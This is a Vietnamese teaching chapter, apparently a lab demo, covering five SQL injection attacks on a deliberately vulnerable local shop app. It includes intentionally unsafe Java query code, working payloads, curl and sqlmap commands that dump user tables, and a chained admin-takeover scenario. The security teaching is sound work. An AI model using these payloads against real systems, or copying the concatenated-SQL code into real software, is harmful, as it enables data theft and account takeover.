# CHƯƠNG 5: KỊCH BẢN TẤN CÔNG THỰC HÀNH — HPB-Shop Demo

> **Môi trường demo:**
> - Ứng dụng web: HPB-Shop (Spring Boot + MySQL)
> - Backend: `http://localhost:8080`
> - Frontend: `http://localhost:5500`
> - Công cụ: Trình duyệt Chrome, curl, sqlmap

---

## 5.1 Kịch bản 1 — Authentication Bypass (Bypass Xác thực)

### Mục tiêu
Đăng nhập vào tài khoản admin mà **không cần biết mật khẩu**, chỉ cần biết username.

### Endpoint bị tấn công
```
POST http://localhost:8080/api/auth/login
Content-Type: application/json
```

### Code lỗ hổng (UserService.java)
```java
// [VULN] Ghép chuỗi trực tiếp — không escape
String sql = "SELECT * FROM users WHERE username='" + identifier
           + "' AND password='" + password + "'";
```

### Bước thực hiện

**Bước 1:** Mở trang đăng nhập tại `http://localhost:5500/Dang-nhap.html`

Giao diện hiển thị form đăng nhập bình thường của cửa hàng HPB Sports.

**Bước 2:** Nhập payload vào form

| Trường | Giá trị thông thường | Giá trị tấn công |
|--------|---------------------|-----------------|
| Username | `admin` | `admin' -- ` *(có khoảng trắng sau --)* |
| Password | `admin123` | `batky_gicung_duoc` |

**Bước 3:** Phân tích SQL được sinh ra

*Với login bình thường:*
```sql
SELECT * FROM users
WHERE username='admin' AND password='admin123'
```
→ Trả về user chỉ khi CẢ HAI điều kiện đúng.

*Với payload tấn công:*
```sql
SELECT * FROM users
WHERE username='admin' -- ' AND password='batky_gicung_duoc'
--                     ^^
--               Comment MySQL: phần sau bị bỏ qua hoàn toàn
```
→ Chỉ cần username='admin' tồn tại là đăng nhập thành công.

**Bước 4:** Kiểm chứng bằng curl
```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"loginId":"admin'\'' -- ","password":"sai_mat_khau"}'
```

**Kết quả nhận được (HTTP 200):**
```json
{
  "token": "eyJhbGciOiJIUzI1NiJ9...",
  "user": {
    "userId": 1,
    "username": "admin",
    "role": "admin",
    "status": "active"
  }
}
```
→ Server trả về JWT token và thông tin admin — đăng nhập thành công dù mật khẩu sai.

### Payload bổ sung — Đăng nhập mà không cần biết username

```
Username: ' OR role='admin' -- 
Password: x
```

SQL sinh ra:
```sql
SELECT * FROM users
WHERE username='' OR role='admin' -- ' AND password='x'
```
→ Điều kiện `role='admin'` luôn đúng cho một user trong DB → trả về admin đầu tiên.

### Tác hại
- Attacker chiếm được tài khoản admin với đầy đủ quyền quản trị
- Truy cập được toàn bộ dữ liệu hệ thống (đơn hàng, khách hàng, tồn kho)
- Có thể thay đổi, xóa dữ liệu trong Admin Dashboard

---

## 5.2 Kịch bản 2 — UNION-based SQL Injection (Trích xuất dữ liệu)

### Mục tiêu
Sử dụng toán tử `UNION SELECT` để **đánh cắp toàn bộ dữ liệu người dùng** (username, password hash) thông qua chức năng tìm kiếm sản phẩm.

### Endpoint bị tấn công
```
GET http://localhost:8080/api/products/search?keyword=<PAYLOAD>
```

### Code lỗ hổng (ProductService.java)
```java
// [VULN] Ghép keyword trực tiếp vào LIKE
String sql = "SELECT product_id AS productId, name, brand, price, "
           + "image_url AS imageUrl, description, stock, sku "
           + "FROM products WHERE name LIKE '%" + keyword + "%' "
           + "OR brand LIKE '%" + keyword + "%'";
```

### Bước thực hiện

**Bước 1: Xác định số cột của query gốc**

Query gốc SELECT 8 cột: `product_id, name, brand, price, image_url, description, stock, sku`

*Kiểm tra bằng ORDER BY:*
```
keyword: test' ORDER BY 8-- 
```
→ Không lỗi (có đúng 8 cột)
```
keyword: test' ORDER BY 9-- 
```
→ Lỗi "Unknown column '9' in 'order clause'" → xác nhận có **8 cột**.

**Bước 2: Thực hiện UNION SELECT dump bảng users**

Payload tại ô tìm kiếm trên trang chủ:
```
%' UNION SELECT user_id, username, email, 0, password, role, 0, 'hack' FROM users-- 
```

URL đầy đủ (URL-encoded):
```
http://localhost:8080/api/products/search?keyword=%25%27%20UNION%20SELECT%20user_id%2Cusername%2Cemail%2C0%2Cpassword%2Crole%2C0%2C%27hack%27%20FROM%20users--%20
```

**Bước 3: Phân tích SQL được sinh ra**
```sql
SELECT product_id, name, brand, price, image_url, description, stock, sku
FROM products
WHERE name LIKE '%%'               ← khớp tất cả sản phẩm (vì %% = %)
OR brand LIKE '%%'
UNION
SELECT user_id, username, email, 0, password, role, 0, 'hack'
FROM users-- '
```

**Bước 4: Kết quả nhận được**

API trả về JSON chứa cả sản phẩm lẫn dữ liệu user:
```json
[
  { "productId": 1, "name": "Yonex Astrox 99 Pro", "brand": "Yonex", ... },
  ...
  { "productId": 1, "name": "admin",        "brand": "admin@hpb.com",
    "imageUrl": "$2a$10$H7nIjr...(BCrypt hash)...",
    "description": "admin" },
  { "productId": 2, "name": "customer1",    "brand": "customer1@gmail.com",
    "imageUrl": "$2a$10$abc...",
    "description": "customer" },
  ...
]
```
→ **Toàn bộ username, email, password hash và role của mọi user đã bị lộ.**

**Bước 5: Tự động hóa với sqlmap**
```bash
# Phát hiện lỗ hổng và liệt kê database
sqlmap -u "http://localhost:8080/api/products/search?keyword=test" \
  --batch --dbs

# Dump toàn bộ bảng users
sqlmap -u "http://localhost:8080/api/products/search?keyword=test" \
  --batch -D HPBSports_DB -T users --dump
```

### Tác hại
- Lộ toàn bộ thông tin người dùng: username, email, số điện thoại, password hash
- Attacker có thể dùng công cụ crack hash (Hashcat, John the Ripper) để tìm lại mật khẩu gốc
- Dữ liệu có thể bị rao bán hoặc dùng để tấn công các dịch vụ khác (credential stuffing)

---

## 5.3 Kịch bản 3 — Error-based SQL Injection (Trích xuất qua Error Message)

### Mục tiêu
Khai thác thông báo lỗi MySQL để **đọc thông tin nhạy cảm** (phiên bản DB, tên database, dữ liệu trong bảng) mà không cần UNION.

### Endpoint bị tấn công
```
GET http://localhost:8080/api/products/{id}
```

### Code lỗ hổng (ProductService.java)
```java
// [VULN] Ghép id String vào SQL + expose error message
String sql = "SELECT ... FROM products WHERE product_id=" + id;
try {
    return jdbcTemplate.queryForList(sql);
} catch (DataAccessException e) {
    throw new RuntimeException(e.getMostSpecificCause().getMessage()); // ← lộ lỗi MySQL
}
```

### Nguyên lý khai thác
Hàm `EXTRACTVALUE()` trong MySQL: khi tham số XPath không hợp lệ, MySQL **ném ra lỗi chứa giá trị của subquery** trong message:
```sql
EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_data)))
-- Lỗi: XPATH syntax error: '~<giá trị secret_data>'
```
Kết hợp với `server.error.include-message=always` trong `application.properties` → lỗi được trả về client qua HTTP response.

### Bước thực hiện

**Bước 1: Xác nhận lỗ hổng**

Truy cập sản phẩm bình thường:
```
http://localhost:5500/Chi-tiet-san-pham.html?id=1
```
→ Hiện thông tin sản phẩm bình thường.

Thêm payload tấn công vào URL (thay `1` bằng payload):

**Bước 2: Đọc phiên bản MySQL**
```
http://localhost:8080/api/products/1 AND extractvalue(1,concat(0x7e,(SELECT version())))
```
*(URL-encoded: `1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))`)*

**Response (HTTP 500):**
```json
{
  "status": 500,
  "error": "Internal Server Error",
  "message": "XPATH syntax error: '~8.4.7'"
}
```
→ Phiên bản MySQL: **8.4.7**

**Bước 3: Đọc tên database đang dùng**
```
1 AND extractvalue(1,concat(0x7e,(SELECT database())))
```

**Response:**
```json
{ "message": "XPATH syntax error: '~HPBSports_DB'" }
```
→ Tên database: **HPBSports_DB**

**Bước 4: Liệt kê các bảng trong database**
```
1 AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='HPBSports_DB')))
```

**Response:**
```json
{ "message": "XPATH syntax error: '~cart_items,inventory_logs,order_items,orders,products,users'" }
```
→ Database có 6 bảng, trong đó có bảng **users** và **orders**.

**Bước 5: Đọc password hash của admin**
```
1 AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin')))
```

**Response:**
```json
{ "message": "XPATH syntax error: '~$2a$10$H7nIjrbVbNwp05DONi0Aio'" }
```
→ Phần đầu của BCrypt hash password admin bị lộ.

> **Lưu ý:** `EXTRACTVALUE` chỉ trả về tối đa 32 ký tự. Để lấy đủ hash (60 ký tự), dùng `SUBSTRING`:
> ```sql
> 1 AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users WHERE username='admin'),1,32)))
> 1 AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users WHERE username='admin'),33,32)))
> ```

**Bước 6: Tự động hóa với sqlmap**
```bash
sqlmap -u "http://localhost:8080/api/products/1" \
  --technique=E --batch \
  --current-user --current-db --dbs \
  -D HPBSports_DB -T users --dump
```

### Tác hại
- Attacker thu thập được cấu trúc toàn bộ database chỉ bằng vài request HTTP
- Password hash bị lộ có thể bị crack offline
- Thông tin phiên bản DB giúp attacker tìm CVE phù hợp để leo thang tấn công

---

## 5.4 Kịch bản 4 — Boolean-based Blind SQL Injection

### Mục tiêu
Khai thác sự **khác biệt trong phản hồi** (có/không có sản phẩm) để suy luận từng ký tự của dữ liệu nhạy cảm, **không cần server trả về dữ liệu trực tiếp**.

### Endpoint bị tấn công
```
GET http://localhost:8080/api/products/filter?brand=<PAYLOAD>
```

### Code lỗ hổng (ProductService.java)
```java
// [VULN] Ghép brand trực tiếp vào WHERE clause
if (brand != null && !brand.isBlank()) {
    sql.append(" AND brand='").append(brand).append("'"); // ← injection point
}
```

### Nguyên lý khai thác

Attacker không thấy dữ liệu trực tiếp, nhưng phân biệt được hai trạng thái:
- **TRUE**: `brand=Yonex' AND 1=1-- ` → trả về 4 sản phẩm Yonex → **điều kiện ĐÚNG**
- **FALSE**: `brand=Yonex' AND 1=2-- ` → trả về 0 sản phẩm → **điều kiện SAI**

Bằng cách thay `1=1`/`1=2` bằng các điều kiện truy vấn, attacker dò từng bit thông tin.

### Bước thực hiện

**Bước 1: Xác nhận injection point**

*Payload TRUE (`1=1`):*
```bash
curl "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D1--%20"
```
→ Trả về **4 sản phẩm** Yonex ✓

*Payload FALSE (`1=2`):*
```bash
curl "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D2--%20"
```
→ Trả về **0 sản phẩm** ✓

→ Sự khác biệt TRUE/FALSE được xác nhận — injection hoạt động.

**Bước 2: Dò độ dài password hash của admin**

```bash
# LENGTH(password) = 60 ?
curl "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%20LENGTH((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27))%3D60--%20"
```
→ Trả về 4 sản phẩm (TRUE) → hash có **60 ký tự** (đúng với BCrypt).

**Bước 3: Dò từng ký tự password hash**

```bash
# Ký tự thứ 1 của hash = '$' ?
curl "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%20SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27%24%27--%20"
```
→ Trả về 4 sản phẩm (TRUE) → ký tự đầu là **`$`** (BCrypt luôn bắt đầu bằng `$`).

| Lần thử | Payload | Kết quả | Ký tự |
|---------|---------|---------|-------|
| 1 | `SUBSTRING(...,1,1)='$'` | 4 sp (TRUE) | `$` |
| 2 | `SUBSTRING(...,2,1)='2'` | 4 sp (TRUE) | `2` |
| 3 | `SUBSTRING(...,3,1)='a'` | 4 sp (TRUE) | `a` |
| 4 | `SUBSTRING(...,4,1)='$'` | 4 sp (TRUE) | `$` |
| ... | ... | ... | ... |
| 60 | `SUBSTRING(...,60,1)='O'` | 4 sp (TRUE) | `O` |

→ Sau 60 lần thử (tự động hóa), khôi phục được toàn bộ hash: `$2a$10$H7nIjr...`

**Bước 4: Tự động hóa với sqlmap (Boolean technique)**
```bash
sqlmap -u "http://localhost:8080/api/products/filter?brand=Yonex" \
  --technique=B \
  --batch \
  -D HPBSports_DB -T users -C username,password \
  --dump
```

sqlmap tự động binary search qua từng ký tự, dump được toàn bộ password hash trong vài phút.

**Bước 5: Demo qua giao diện trình duyệt**

Truy cập các URL sau và quan sát số lượng sản phẩm hiển thị:

| URL (dán vào trình duyệt) | Kết quả kỳ vọng |
|---------------------------|----------------|
| `?brand=Yonex%27%20AND%201%3D1--%20` | 4 sản phẩm (TRUE) |
| `?brand=Yonex%27%20AND%201%3D2--%20` | 0 sản phẩm (FALSE) |
| `?brand=Yonex%27%20AND%20SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27%24%27--%20` | 4 sản phẩm (ký tự đầu hash là '$') |

### Tác hại
- Mặc dù chậm hơn UNION-based, attacker vẫn có thể trích xuất **toàn bộ dữ liệu** trong database
- Khó phát hiện hơn vì response body không chứa dữ liệu nhạy cảm
- `sqlmap` tự động hóa hoàn toàn quá trình, giảm từ hàng nghìn request thủ công xuống còn vài phút

---

## 5.5 Kịch bản 5 — Time-based Blind SQL Injection

### Mục tiêu
Khai thác **thời gian phản hồi** của server để suy luận thông tin mà **không cần bất kỳ sự khác biệt nào trong response body** — nguy hiểm nhất vì không để lại dấu vết trên nội dung trả về.

### Endpoint bị tấn công
```
GET http://localhost:8080/api/customer/orders/my-orders/{userId}
Authorization: Bearer <JWT_TOKEN>
```

### Code lỗ hổng (OrderService.java)
```java
// [VULN] Ghép userId String vào WHERE — không validate kiểu dữ liệu
StringBuilder sql = new StringBuilder(
    "SELECT ... FROM orders WHERE user_id=").append(userId); // ← injection point
```

### Nguyên lý khai thác

MySQL cung cấp hàm `SLEEP(n)` để làm server chờ `n` giây. Kết hợp với `IF`:
```sql
IF(condition, SLEEP(3), 0)
-- Nếu condition TRUE  → MySQL ngủ 3 giây → response delay ≥ 3s
-- Nếu condition FALSE → MySQL trả ngay   → response delay < 0.1s
```
Attacker đo thời gian phản hồi để phân biệt TRUE/FALSE.

### Bước thực hiện

**Bước 1: Lấy JWT token (dùng Auth Bypass từ Kịch bản 1)**
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"loginId":"admin'\'' -- ","password":"x"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
echo "Token: ${TOKEN:0:40}..."
```

**Bước 2: Xác nhận injection — đo thời gian với `SLEEP(3)`**

*Payload TRUE — ký tự đầu hash = '$':*
```bash
time curl -s -o /dev/null \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/1%20AND%20IF(SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27%24%27%2CSLEEP(3)%2C0)"
```
**Kết quả:**
```
real    0m3.412s   ← Delay ~3 giây → ký tự đầu là '$' (TRUE) ✓
user    0m0.010s
```

*Payload FALSE — ký tự đầu hash = 'X':*
```bash
time curl -s -o /dev/null \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/1%20AND%20IF(SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27X%27%2CSLEEP(3)%2C0)"
```
**Kết quả:**
```
real    0m0.087s   ← Phản hồi ngay → ký tự đầu KHÔNG phải 'X' (FALSE) ✓
user    0m0.008s
```

**Bước 3: Bảng so sánh thời gian phản hồi**

| Payload | Thời gian phản hồi | Kết luận |
|---------|-------------------|---------|
| `SLEEP(3)` thuần túy | ~3.1s | SLEEP hoạt động |
| `IF(1=1, SLEEP(3), 0)` | ~3.1s | TRUE |
| `IF(1=2, SLEEP(3), 0)` | ~0.08s | FALSE |
| `IF(ký_tự_đầu='$', SLEEP(3), 0)` | ~3.4s | TRUE — ký tự là '$' |
| `IF(ký_tự_thứ2='2', SLEEP(3), 0)` | ~3.2s | TRUE — ký tự là '2' |

→ Bằng cách lặp lại 60 lần cho 60 ký tự của hash, attacker khôi phục được mật khẩu.

**Bước 4: Tự động hóa với sqlmap (Time-based technique)**
```bash
sqlmap -u "http://localhost:8080/api/customer/orders/my-orders/1" \
  --headers "Authorization: Bearer $TOKEN" \
  --technique=T \
  --time-sec=3 \
  --batch \
  -D HPBSports_DB -T users -C username,password \
  --dump
```
sqlmap tự động đo độ trễ và dựng lại dữ liệu từng ký tự. Toàn bộ bảng users được dump sau ~10-20 phút (tùy tốc độ mạng).

### Đặc điểm nguy hiểm của Time-based
- **Response body không thay đổi** — không có dữ liệu lộ ra, chỉ có thời gian khác nhau
- Khó phát hiện bằng hệ thống giám sát thông thường
- Hoạt động ngay cả khi ứng dụng không hiển thị bất kỳ output nào

### Tác hại
- Giống Boolean Blind về mức độ nghiêm trọng nhưng **khó phát hiện hơn nhiều**
- Có thể gây **tấn công từ chối dịch vụ (DoS)** vì mỗi request làm server delay
- Nếu chạy nhiều `SLEEP` song song có thể làm cạn kiệt connection pool của database

---

## 5.6 So sánh tổng quan 5 kịch bản tấn công

| Kịch bản | Loại SQLi | Endpoint | Yêu cầu | Tốc độ | Khó phát hiện |
|----------|----------|---------|---------|--------|--------------|
| 1 — Auth Bypass | In-band | `/api/auth/login` | Biết username | Ngay lập tức | Thấp |
| 2 — UNION-based | In-band | `/api/products/search` | Xác định số cột | Nhanh | Thấp |
| 3 — Error-based | In-band | `/api/products/{id}` | Server hiển thị lỗi | Nhanh | Thấp |
| 4 — Boolean Blind | Blind | `/api/products/filter` | Phân biệt TRUE/FALSE | Chậm | Trung bình |
| 5 — Time-based Blind | Blind | `/api/customer/orders/...` | Đo thời gian phản hồi | Rất chậm | **Cao** |

---

## 5.7 Kịch bản kết hợp — Chuỗi tấn công hoàn chỉnh

Trong thực tế, attacker có thể kết hợp nhiều kỹ thuật theo chuỗi:

```
Bước 1: Dùng Kịch bản 3 (Error-based) để liệt kê cấu trúc DB
         → Biết được bảng "users" có cột "password"

Bước 2: Dùng Kịch bản 2 (UNION-based) để dump bảng users
         → Lấy được BCrypt hash của admin

Bước 3: Crack hash offline bằng Hashcat/John the Ripper
         → Khôi phục được mật khẩu gốc: "admin123"

Bước 4: Dùng Kịch bản 1 (Auth Bypass hoặc đăng nhập bình thường)
         → Đăng nhập vào Admin Dashboard với quyền cao nhất

Kết quả: Chiếm quyền kiểm soát hoàn toàn hệ thống
```

---

## 5.8 Hướng dẫn demo trực tiếp (Workflow ~8 phút)

| Thời gian | Hành động | URL/Lệnh |
|-----------|----------|---------|
| 0:00 | Mở trang chủ HPB-Shop | `http://localhost:5500/Trang-chu.html` |
| 0:30 | **Kịch bản 1** — Gõ `admin' -- ` vào form đăng nhập | `http://localhost:5500/Dang-nhap.html` |
| 1:30 | **Kịch bản 2** — Dán payload UNION vào ô tìm kiếm | Trang chủ → ô search |
| 3:00 | **Kịch bản 3** — Sửa URL chi tiết sản phẩm thêm payload | Thanh địa chỉ trình duyệt |
| 4:00 | **Kịch bản 4** — Chạy `sqlmap --technique=B` | Terminal |
| 5:30 | **Kịch bản 5** — Chạy `sqlmap --technique=T` | Terminal |
| 7:00 | **So sánh** — `git checkout main`, restart → payload thất bại | Chiếu JPA prepared statements |
